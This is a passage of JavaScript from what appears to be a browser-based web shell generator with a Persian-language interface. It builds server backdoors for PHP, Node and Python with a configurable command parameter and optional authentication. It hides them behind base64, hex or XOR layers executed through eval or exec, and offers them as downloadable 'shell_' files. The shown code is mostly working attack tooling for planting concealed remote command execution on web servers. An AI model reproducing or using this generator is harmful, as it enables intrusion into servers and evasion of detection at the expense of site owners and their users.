function obfPHP(code, mode, key){

    var k2 = 'k'+rnd(4), v2 = 'v'+rnd(4);
    return '<?php '+pre2+'$'+k2+'="'+key+'"; $'+v2+'=base64_decode('+names2.join('.')+'); $r=""; for($i=0;$i<strlen($'+v2+');$i++){ $r.=chr(ord($'+v2+'[$i]) ^ ord($'+k2+'[$i%strlen($'+k2+')])); } @eval($r); ?>';
  }
  return code;
}
function obfNode(code, mode, key){

  if(mode === 'none') return code;
  if(mode === 'base64') return 'import base64; exec(base64.b64decode("'+b64(code)+'").decode())';
  if(mode === 'hex') return 'exec(bytes.fromhex("'+hex(code)+'").decode())';
  if(mode === 'xor'){
    var e = b64(xorS(code, key));
    return 'import base64; k="'+key+'"; d=base64.b64decode("'+e+'"); r="".join(chr(d[i]^ord(k[i%len(k)])) for i in range(len(d))); exec(r)';
  }
  return code;
}
function applyObf(lang, code, mode, key){
  if(lang === 'php') return obfPHP(code, mode, key);
  if(lang === 'node') return obfNode(code, mode, key);
  if(lang === 'python') return obfPython(code, mode, key);
  return code;
}
function build(){
  var p = { lang: state.lang, execMethod: state.execMethod, paramName: state.paramName, authEnabled: state.authEnabled, authType: state.authType, authValue: state.authValue, features: state.features[state.lang] };
  var rawCode = raw(state.lang, p);
  return applyObf(state.lang, rawCode, state.obfuscation, state.xorKey);
}
function fmtSize(n){ if(n < 1024) return n + ' B'; if(n < 1048576) return (n/1024).toFixed(1) + ' KB'; return (n/1048576).toFixed(2) + ' MB'; }
function update(){
  var out = build();
  $('output').value = out;
  $('statSize').textContent = fmtSize(new Blob([out]).size);
  $('statLines').textContent = out.split('\n').length;
  var obfL = { none:'بدون', base64:'Base64', hex:'Hex', xor:'XOR', split:'Split', combo:'Combo' };
  $('statObf').textContent = obfL[state.obfuscation] || state.obfuscation;
  $('statObf').className = 'stat-v' + (state.obfuscation === 'none' ? '' : ' ok');
  $('langTag').textContent = LANGS[state.lang].name;
  var helpLines = LANGS[state.lang].help.split('\n').map(function(l){ return '<div>' + l.replace(/\?(.+?)—/g, '?<span style="color:#2563eb">$1</span>—').replace(/GET|POST/g, '<b>$&</b>') + '</div>'; }).join('');
  $('helpContent').innerHTML = helpLines;
}
function bind(){
  $('lang').addEventListener('change', function(e){
    state.lang = e.target.value;
    state.execMethod = LANGS[state.lang].exec[0];
    renderExec();
    renderFeatures();
    update();
  });
  $('execMethod').addEventListener('change', function(e){ state.execMethod = e.target.value; update(); });
  $('paramName').addEventListener('input', function(e){ state.paramName = e.target.value.trim() || 'cmd'; update(); });
  $('randomParam').addEventListener('click', function(){ state.paramName = rnd(4).toLowerCase(); $('paramName').value = state.paramName; update(); });
  $('authEnable').addEventListener('change', function(e){ state.authEnabled = e.target.checked; $('authWrap').style.display = state.authEnabled ? 'block' : 'none'; update(); });
  $('authType').addEventListener('change', function(e){ state.authType = e.target.value; update(); });
  $('authValue').addEventListener('input', function(e){ state.authValue = e.target.value; update(); });
  $('obfuscation').addEventListener('change', function(e){
    state.obfuscation = e.target.value;
    var w = state.obfuscation === 'xor' || state.obfuscation === 'combo';
    $('xorWrap').style.display = w ? 'block' : 'none';
    update();
  });
  $('xorKey').addEventListener('input', function(e){ state.xorKey = e.target.value || 's3cr3t'; update(); });
  $('copyBtn').addEventListener('click', function(){
    var ta = $('output');
    ta.select();
    try { document.execCommand('copy'); this.textContent = 'کپی شد'; var s = this; setTimeout(function(){ s.textContent = 'کپی'; }, 1500); } catch(e){ this.textContent = 'خطا'; }
  });
  $('downloadBtn').addEventListener('click', function(){
    var extM = { php:'php', asp:'asp', jsp:'jsp', node:'js', python:'py', perl:'pl', ruby:'rb', bash:'sh' };
    var ext = extM[state.lang] || 'txt';
    var blob = new Blob([$('output').value], { type:'text/plain' });
    var a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'shell_' + Date.now() + '.' + ext;
    a.click();
    setTimeout(function(){ URL.revokeObjectURL(a.href); }, 1000);
  });
}
bind();
renderExec();
renderFeatures();
update();
})();
</script>
